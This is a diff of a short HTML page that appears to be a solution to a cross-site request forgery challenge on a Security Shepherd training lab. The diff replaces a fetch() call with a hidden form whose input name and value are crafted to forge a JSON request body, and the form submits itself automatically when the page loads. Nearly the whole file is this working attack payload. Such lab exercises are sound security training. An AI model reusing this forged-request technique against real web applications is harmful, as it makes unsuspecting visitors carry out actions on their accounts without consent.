@@ -1,28 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form action="https://shepherd.websec.dedyn.io/user/csrfchallengejson/plusplus" method="POST" name="csrf">
+<form action="https://shepherd.websec.dedyn.io/user/csrfchallengejson/plusplus" method="POST" name="csrf" enctype="application/json">
 <!--input type="hidden" name="userId" value="398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8"/-->
 <!--input type="hidden" name="csrfToken" value="105700736606562306760126015519665357624"/-->
-<!--input type="hidden" name='{"userId":"398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8"}'-->
+<input type="hidden" name="{\"userId" value="398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8\"}">
 </form>
 <script>
-  window.onload = function(){
-    fetch('https://shepherd.websec.dedyn.io/user/csrfchallengejson/plusplus', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ userId: '398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8' }),
-      mode: 'cors',
-    })
-    .then(response => response.json())
-    .then(data => console.log(data))
-    .catch(error => console.error('Error:', error));
-  };
+  document.csrf.submit();
 </script>
 </body>
 </html>
+
 
 
 
